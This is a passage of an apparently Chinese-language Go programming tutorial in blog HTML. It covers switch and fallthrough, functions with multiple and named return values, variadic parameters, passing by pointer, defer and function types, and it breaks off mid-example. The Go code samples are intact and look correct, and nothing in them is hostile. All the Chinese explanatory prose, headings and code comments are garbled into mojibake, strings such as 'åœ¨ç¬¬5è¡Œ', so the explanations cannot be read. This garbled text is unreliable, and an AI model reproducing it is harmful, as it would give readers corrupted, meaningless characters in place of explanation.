<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">i := <span class="number">10</span></span><br><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;i is equal to 1&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;i is equal to 2, 3 or 4&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;i is equal to 10&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;All I know is that i is an integer&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ç¬¬5è¡Œä¸­ï¼Œæˆ‘ä»¬æŠŠå¾ˆå¤šå€¼èšåˆåœ¨äº†ä¸€ä¸ª<code>case</code>é‡Œé¢ï¼ŒåŒæ—¶ï¼ŒGoé‡Œé¢<code>switch</code>é»˜è®¤ç›¸å½“äºæ¯ä¸ª<code>case</code>æœ€åå¸¦æœ‰<code>break</code>ï¼ŒåŒ¹é…æˆåŠŸåä¸ä¼šè‡ªåŠ¨å‘ä¸‹æ‰§è¡Œå…¶ä»–caseï¼Œè€Œæ˜¯è·³å‡ºæ•´ä¸ª<code>switch</code>, ä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>fallthrough</code>å¼ºåˆ¶æ‰§è¡Œåé¢çš„caseä»£ç ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">integer := <span class="number">6</span></span><br><span class="line"><span class="keyword">switch</span> integer &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer was &lt;= 4&quot;</span>)</span><br><span class="line">	<span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer was &lt;= 5&quot;</span>)</span><br><span class="line">	<span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer was &lt;= 6&quot;</span>)</span><br><span class="line">	<span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer was &lt;= 7&quot;</span>)</span><br><span class="line">	<span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer was &lt;= 8&quot;</span>)</span><br><span class="line">	<span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;default case&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ç¨‹åºå°†è¾“å‡º</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">The integer was &lt;= <span class="number">6</span></span><br><span class="line">The integer was &lt;= <span class="number">7</span></span><br><span class="line">The integer was &lt;= <span class="number">8</span></span><br><span class="line"><span class="keyword">default</span> <span class="keyword">case</span></span><br></pre></td></tr></table></figure>
<h2 id="å‡½æ•°"><a class="markdownIt-Anchor" href="#å‡½æ•°"></a> å‡½æ•°</h2>
<p>å‡½æ•°æ˜¯Goé‡Œé¢çš„æ ¸å¿ƒè®¾è®¡ï¼Œå®ƒé€šè¿‡å…³é”®å­—<code>func</code>æ¥å£°æ˜ï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcName</span><span class="params">(input1 type1, input2 type2)</span></span> (output1 type1, output2 type2) &#123;</span><br><span class="line">	<span class="comment">//è¿™é‡Œæ˜¯å¤„ç†é€»è¾‘ä»£ç </span></span><br><span class="line">	<span class="comment">//è¿”å›å¤šä¸ªå€¼</span></span><br><span class="line">	<span class="keyword">return</span> value1, value2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç æˆ‘ä»¬çœ‹å‡º</p>
<ul>
<li>å…³é”®å­—<code>func</code>ç”¨æ¥å£°æ˜ä¸€ä¸ªå‡½æ•°<code>funcName</code></li>
<li>å‡½æ•°å¯ä»¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°åé¢å¸¦æœ‰ç±»å‹ï¼Œé€šè¿‡<code>,</code>åˆ†éš”</li>
<li>å‡½æ•°å¯ä»¥è¿”å›å¤šä¸ªå€¼</li>
<li>ä¸Šé¢è¿”å›å€¼å£°æ˜äº†ä¸¤ä¸ªå˜é‡<code>output1</code>å’Œ<code>output2</code>ï¼Œå¦‚æœä½ ä¸æƒ³å£°æ˜ä¹Ÿå¯ä»¥ï¼Œç›´æ¥å°±ä¸¤ä¸ªç±»å‹</li>
<li>å¦‚æœåªæœ‰ä¸€ä¸ªè¿”å›å€¼ä¸”ä¸å£°æ˜è¿”å›å€¼å˜é‡ï¼Œé‚£ä¹ˆä½ å¯ä»¥çœç•¥ åŒ…æ‹¬è¿”å›å€¼ çš„æ‹¬å·</li>
<li>å¦‚æœæ²¡æœ‰è¿”å›å€¼ï¼Œé‚£ä¹ˆå°±ç›´æ¥çœç•¥æœ€åçš„è¿”å›ä¿¡æ¯</li>
<li>å¦‚æœæœ‰è¿”å›å€¼ï¼Œ é‚£ä¹ˆå¿…é¡»åœ¨å‡½æ•°çš„å¤–å±‚æ·»åŠ returnè¯­å¥</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®é™…åº”ç”¨å‡½æ•°çš„ä¾‹å­ï¼ˆç”¨æ¥è®¡ç®—Maxå€¼ï¼‰</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›aã€bä¸­æœ€å¤§å€¼.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	x := <span class="number">3</span></span><br><span class="line">	y := <span class="number">4</span></span><br><span class="line">	z := <span class="number">5</span></span><br><span class="line"></span><br><span class="line">	max_xy := max(x, y) <span class="comment">//è°ƒç”¨å‡½æ•°max(x, y)</span></span><br><span class="line">	max_xz := max(x, z) <span class="comment">//è°ƒç”¨å‡½æ•°max(x, z)</span></span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, x, y, max_xy)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, x, z, max_xz)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;max(%d, %d) = %d\n&quot;</span>, y, z, max(y,z)) <span class="comment">// ä¹Ÿå¯åœ¨è¿™ç›´æ¥è°ƒç”¨å®ƒ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™ä¸ªé‡Œé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>max</code>å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå®ƒä»¬çš„ç±»å‹éƒ½æ˜¯<code>int</code>ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå˜é‡çš„ç±»å‹å¯ä»¥çœç•¥ï¼ˆå³ a,b int,è€Œé a int, b int)ï¼Œé»˜è®¤ä¸ºç¦»å®ƒæœ€è¿‘çš„ç±»å‹ï¼ŒåŒç†å¤šäº2ä¸ªåŒç±»å‹çš„å˜é‡æˆ–è€…è¿”å›å€¼ã€‚åŒæ—¶æˆ‘ä»¬æ³¨æ„åˆ°å®ƒçš„è¿”å›å€¼å°±æ˜¯ä¸€ä¸ªç±»å‹ï¼Œè¿™ä¸ªå°±æ˜¯çœç•¥å†™æ³•ã€‚</p>
<h3 id="å¤šä¸ªè¿”å›å€¼"><a class="markdownIt-Anchor" href="#å¤šä¸ªè¿”å›å€¼"></a> å¤šä¸ªè¿”å›å€¼</h3>
<p>Goè¯­è¨€æ¯”Cæ›´å…ˆè¿›çš„ç‰¹æ€§ï¼Œå…¶ä¸­ä¸€ç‚¹å°±æ˜¯å‡½æ•°èƒ½å¤Ÿè¿”å›å¤šä¸ªå€¼ã€‚</p>
<p>æˆ‘ä»¬ç›´æ¥ä¸Šä»£ç çœ‹ä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿”å› A+B å’Œ A*B</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumAndProduct</span><span class="params">(A, B <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> A+B, A*B</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	x := <span class="number">3</span></span><br><span class="line">	y := <span class="number">4</span></span><br><span class="line"></span><br><span class="line">	xPLUSy, xTIMESy := SumAndProduct(x, y)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d + %d = %d\n&quot;</span>, x, y, xPLUSy)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d * %d = %d\n&quot;</span>, x, y, xTIMESy)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›äº†ä¸¤ä¸ªå‚æ•°ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘½åè¿”å›å‚æ•°çš„å˜é‡ï¼Œè¿™ä¸ªä¾‹å­é‡Œé¢åªæ˜¯ç”¨äº†ä¸¤ä¸ªç±»å‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ”¹æˆå¦‚ä¸‹è¿™æ ·çš„å®šä¹‰ï¼Œç„¶åè¿”å›çš„æ—¶å€™ä¸ç”¨å¸¦ä¸Šå˜é‡åï¼Œå› ä¸ºç›´æ¥åœ¨å‡½æ•°é‡Œé¢åˆå§‹åŒ–äº†ã€‚ä½†å¦‚æœä½ çš„å‡½æ•°æ˜¯å¯¼å‡ºçš„(é¦–å­—æ¯å¤§å†™)ï¼Œå®˜æ–¹å»ºè®®ï¼šæœ€å¥½å‘½åè¿”å›å€¼ï¼Œå› ä¸ºä¸å‘½åè¿”å›å€¼ï¼Œè™½ç„¶ä½¿å¾—ä»£ç æ›´åŠ ç®€æ´äº†ï¼Œä½†æ˜¯ä¼šé€ æˆç”Ÿæˆçš„æ–‡æ¡£å¯è¯»æ€§å·®ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumAndProduct</span><span class="params">(A, B <span class="type">int</span>)</span></span> (add <span class="type">int</span>, Multiplied <span class="type">int</span>) &#123;</span><br><span class="line">	add = A+B</span><br><span class="line">	Multiplied = A*B</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å˜å‚"><a class="markdownIt-Anchor" href="#å˜å‚"></a> å˜å‚</h3>
<p>Goå‡½æ•°æ”¯æŒå˜å‚ã€‚æ¥å—å˜å‚çš„å‡½æ•°æ˜¯æœ‰ç€ä¸å®šæ•°é‡çš„å‚æ•°çš„ã€‚ä¸ºäº†åšåˆ°è¿™ç‚¹ï¼Œé¦–å…ˆéœ€è¦å®šä¹‰å‡½æ•°ä½¿å…¶æ¥å—å˜å‚ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunc</span><span class="params">(arg ...<span class="type">int</span>)</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p><code>arg ...int</code>å‘Šè¯‰Goè¿™ä¸ªå‡½æ•°æ¥å—ä¸å®šæ•°é‡çš„å‚æ•°ã€‚æ³¨æ„ï¼Œè¿™äº›å‚æ•°çš„ç±»å‹å…¨éƒ¨æ˜¯<code>int</code>ã€‚åœ¨å‡½æ•°ä½“ä¸­ï¼Œå˜é‡<code>arg</code>æ˜¯ä¸€ä¸ª<code>int</code>çš„<code>slice</code>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _, n := <span class="keyword">range</span> arg &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;And the number is: %d\n&quot;</span>, n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¼ å€¼ä¸ä¼ æŒ‡é’ˆ"><a class="markdownIt-Anchor" href="#ä¼ å€¼ä¸ä¼ æŒ‡é’ˆ"></a> ä¼ å€¼ä¸ä¼ æŒ‡é’ˆ</h3>
<p>å½“æˆ‘ä»¬ä¼ ä¸€ä¸ªå‚æ•°å€¼åˆ°è¢«è°ƒç”¨å‡½æ•°é‡Œé¢æ—¶ï¼Œå®é™…ä¸Šæ˜¯ä¼ äº†è¿™ä¸ªå€¼çš„ä¸€ä»½copyï¼Œå½“åœ¨è¢«è°ƒç”¨å‡½æ•°ä¸­ä¿®æ”¹å‚æ•°å€¼çš„æ—¶å€™ï¼Œè°ƒç”¨å‡½æ•°ä¸­ç›¸åº”å®å‚ä¸ä¼šå‘ç”Ÿä»»ä½•å˜åŒ–ï¼Œå› ä¸ºæ•°å€¼å˜åŒ–åªä½œç”¨åœ¨copyä¸Šã€‚</p>
<p>ä¸ºäº†éªŒè¯æˆ‘ä»¬ä¸Šé¢çš„è¯´æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç®€å•çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°äº†å‚æ•°+1çš„æ“ä½œ</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(a <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	a = a+<span class="number">1</span> <span class="comment">// æˆ‘ä»¬æ”¹å˜äº†açš„å€¼</span></span><br><span class="line">	<span class="keyword">return</span> a <span class="comment">//è¿”å›ä¸€ä¸ªæ–°å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	x := <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;x = &quot;</span>, x)  <span class="comment">// åº”è¯¥è¾“å‡º &quot;x = 3&quot;</span></span><br><span class="line"></span><br><span class="line">	x1 := add1(x)  <span class="comment">//è°ƒç”¨add1(x)</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;x+1 = &quot;</span>, x1) <span class="comment">// åº”è¯¥è¾“å‡º&quot;x+1 = 4&quot;</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;x = &quot;</span>, x)    <span class="comment">// åº”è¯¥è¾“å‡º&quot;x = 3&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°äº†å—ï¼Ÿè™½ç„¶æˆ‘ä»¬è°ƒç”¨äº†<code>add1</code>å‡½æ•°ï¼Œå¹¶ä¸”åœ¨<code>add1</code>ä¸­æ‰§è¡Œ<code>a = a+1</code>æ“ä½œï¼Œä½†æ˜¯ä¸Šé¢ä¾‹å­ä¸­<code>x</code>å˜é‡çš„å€¼æ²¡æœ‰å‘ç”Ÿå˜åŒ–</p>
<p>ç†ç”±å¾ˆç®€å•ï¼šå› ä¸ºå½“æˆ‘ä»¬è°ƒç”¨<code>add1</code>çš„æ—¶å€™ï¼Œ<code>add1</code>æ¥æ”¶çš„å‚æ•°å…¶å®æ˜¯<code>x</code>çš„copyï¼Œè€Œä¸æ˜¯<code>x</code>æœ¬èº«ã€‚</p>
<p>é‚£ä½ ä¹Ÿè®¸ä¼šé—®äº†ï¼Œå¦‚æœçœŸçš„éœ€è¦ä¼ è¿™ä¸ª<code>x</code>æœ¬èº«,è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>è¿™å°±ç‰µæ‰¯åˆ°äº†æ‰€è°“çš„æŒ‡é’ˆã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå˜é‡åœ¨å†…å­˜ä¸­æ˜¯å­˜æ”¾äºä¸€å®šåœ°å€ä¸Šçš„ï¼Œä¿®æ”¹å˜é‡å®é™…æ˜¯ä¿®æ”¹å˜é‡åœ°å€å¤„çš„å†…å­˜ã€‚åªæœ‰<code>add1</code>å‡½æ•°çŸ¥é“<code>x</code>å˜é‡æ‰€åœ¨çš„åœ°å€ï¼Œæ‰èƒ½ä¿®æ”¹<code>x</code>å˜é‡çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†<code>x</code>æ‰€åœ¨åœ°å€<code>&amp;x</code>ä¼ å…¥å‡½æ•°ï¼Œå¹¶å°†å‡½æ•°çš„å‚æ•°çš„ç±»å‹ç”±<code>int</code>æ”¹ä¸º<code>*int</code>ï¼Œå³æ”¹ä¸ºæŒ‡é’ˆç±»å‹ï¼Œæ‰èƒ½åœ¨å‡½æ•°ä¸­ä¿®æ”¹<code>x</code>å˜é‡çš„å€¼ã€‚æ­¤æ—¶å‚æ•°ä»ç„¶æ˜¯æŒ‰copyä¼ é€’çš„ï¼Œåªæ˜¯copyçš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚è¯·çœ‹ä¸‹é¢çš„ä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç®€å•çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°äº†å‚æ•°+1çš„æ“ä½œ</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(a *<span class="type">int</span>)</span></span> <span class="type">int</span> &#123; <span class="comment">// è¯·æ³¨æ„ï¼Œ</span></span><br><span class="line">	*a = *a+<span class="number">1</span> <span class="comment">// ä¿®æ”¹äº†açš„å€¼</span></span><br><span class="line">	<span class="keyword">return</span> *a <span class="comment">// è¿”å›æ–°å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	x := <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;x = &quot;</span>, x)  <span class="comment">// åº”è¯¥è¾“å‡º &quot;x = 3&quot;</span></span><br><span class="line"></span><br><span class="line">	x1 := add1(&amp;x)  <span class="comment">// è°ƒç”¨ add1(&amp;x) ä¼ xçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;x+1 = &quot;</span>, x1) <span class="comment">// åº”è¯¥è¾“å‡º &quot;x+1 = 4&quot;</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;x = &quot;</span>, x)    <span class="comment">// åº”è¯¥è¾“å‡º &quot;x = 4&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±è¾¾åˆ°äº†ä¿®æ”¹<code>x</code>çš„ç›®çš„ã€‚é‚£ä¹ˆåˆ°åº•ä¼ æŒ‡é’ˆæœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿ</p>
<ul>
<li>ä¼ æŒ‡é’ˆä½¿å¾—å¤šä¸ªå‡½æ•°èƒ½æ“ä½œåŒä¸€ä¸ªå¯¹è±¡ã€‚</li>
<li>ä¼ æŒ‡é’ˆæ¯”è¾ƒè½»é‡çº§ (8bytes),åªæ˜¯ä¼ å†…å­˜åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŒ‡é’ˆä¼ é€’ä½“ç§¯å¤§çš„ç»“æ„ä½“ã€‚å¦‚æœç”¨å‚æ•°å€¼ä¼ é€’çš„è¯, åœ¨æ¯æ¬¡copyä¸Šé¢å°±ä¼šèŠ±è´¹ç›¸å¯¹è¾ƒå¤šçš„ç³»ç»Ÿå¼€é”€ï¼ˆå†…å­˜å’Œæ—¶é—´ï¼‰ã€‚æ‰€ä»¥å½“ä½ è¦ä¼ é€’å¤§çš„ç»“æ„ä½“çš„æ—¶å€™ï¼Œç”¨æŒ‡é’ˆæ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹©ã€‚</li>
<li>Goè¯­è¨€ä¸­<code>channel</code>ï¼Œ<code>slice</code>ï¼Œ<code>map</code>è¿™ä¸‰ç§ç±»å‹çš„å®ç°æœºåˆ¶ç±»ä¼¼æŒ‡é’ˆï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¼ é€’ï¼Œè€Œä¸ç”¨å–åœ°å€åä¼ é€’æŒ‡é’ˆã€‚ï¼ˆæ³¨ï¼šè‹¥å‡½æ•°éœ€æ”¹å˜<code>slice</code>çš„é•¿åº¦ï¼Œåˆ™ä»éœ€è¦å–åœ°å€ä¼ é€’æŒ‡é’ˆï¼‰</li>
</ul>
<h3 id="defer"><a class="markdownIt-Anchor" href="#defer"></a> defer</h3>
<p>Goè¯­è¨€ä¸­æœ‰ç§ä¸é”™çš„è®¾è®¡ï¼Œå³å»¶è¿Ÿï¼ˆdeferï¼‰è¯­å¥ï¼Œä½ å¯ä»¥åœ¨å‡½æ•°ä¸­æ·»åŠ å¤šä¸ªdeferè¯­å¥ã€‚å½“å‡½æ•°æ‰§è¡Œåˆ°æœ€åæ—¶ï¼Œè¿™äº›deferè¯­å¥ä¼šæŒ‰ç…§é€†åºæ‰§è¡Œï¼Œæœ€åè¯¥å‡½æ•°è¿”å›ã€‚ç‰¹åˆ«æ˜¯å½“ä½ åœ¨è¿›è¡Œä¸€äº›æ‰“å¼€èµ„æºçš„æ“ä½œæ—¶ï¼Œé‡åˆ°é”™è¯¯éœ€è¦æå‰è¿”å›ï¼Œåœ¨è¿”å›å‰ä½ éœ€è¦å…³é—­ç›¸åº”çš„èµ„æºï¼Œä¸ç„¶å¾ˆå®¹æ˜“é€ æˆèµ„æºæ³„éœ²ç­‰é—®é¢˜ã€‚å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¸€èˆ¬å†™æ‰“å¼€ä¸€ä¸ªèµ„æºæ˜¯è¿™æ ·æ“ä½œçš„ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadWrite</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	file.Open(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="comment">// åšä¸€äº›å·¥ä½œ</span></span><br><span class="line">	<span class="keyword">if</span> failureX &#123;</span><br><span class="line">		file.Close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> failureY &#123;</span><br><span class="line">		file.Close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file.Close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢æœ‰å¾ˆå¤šé‡å¤çš„ä»£ç ï¼ŒGoçš„<code>defer</code>æœ‰æ•ˆè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ä½¿ç”¨å®ƒåï¼Œä¸ä½†ä»£ç é‡å‡å°‘äº†å¾ˆå¤šï¼Œè€Œä¸”ç¨‹åºå˜å¾—æ›´ä¼˜é›…ã€‚åœ¨<code>defer</code>åæŒ‡å®šçš„å‡½æ•°ä¼šåœ¨å‡½æ•°é€€å‡ºå‰è°ƒç”¨ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadWrite</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	file.Open(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line">	<span class="keyword">if</span> failureX &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> failureY &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæœ‰å¾ˆå¤šè°ƒç”¨<code>defer</code>ï¼Œé‚£ä¹ˆ<code>defer</code>æ˜¯é‡‡ç”¨åè¿›å…ˆå‡ºæ¨¡å¼ï¼Œæ‰€ä»¥å¦‚ä¸‹ä»£ç ä¼šè¾“å‡º<code>4 3 2 1 0</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">	<span class="keyword">defer</span> fmt.Printf(<span class="string">&quot;%d &quot;</span>, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å‡½æ•°ä½œä¸ºå€¼-ç±»å‹"><a class="markdownIt-Anchor" href="#å‡½æ•°ä½œä¸ºå€¼-ç±»å‹"></a> å‡½æ•°ä½œä¸ºå€¼ã€ç±»å‹</h3>
<p>åœ¨Goä¸­å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>type</code>æ¥å®šä¹‰å®ƒï¼Œå®ƒçš„ç±»å‹å°±æ˜¯æ‰€æœ‰æ‹¥æœ‰ç›¸åŒçš„å‚æ•°ï¼Œç›¸åŒçš„è¿”å›å€¼çš„ä¸€ç§ç±»å‹</p>
<pre><code>type typeName func(input1 inputType1 , input2 inputType2 [, ...]) (result1 resultType1 [, ...])
</code></pre>
<p>å‡½æ•°ä½œä¸ºç±»å‹åˆ°åº•æœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿé‚£å°±æ˜¯å¯ä»¥æŠŠè¿™ä¸ªç±»å‹çš„å‡½æ•°å½“åšå€¼æ¥ä¼ é€’ï¼Œè¯·çœ‹ä¸‹é¢çš„ä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> testInt <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">bool</span> <span class="comment">// å£°æ˜äº†ä¸€ä¸ªå‡½æ•°ç±»å‹</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isOdd</span><span class="params">(integer <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> integer%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isEven</span><span class="params">(integer <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> integer%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜çš„å‡½æ•°ç±»å‹åœ¨è¿™ä¸ªåœ°æ–¹å½“åšäº†ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">filter</span><span class="params">(slice []<span class="type">int</span>, 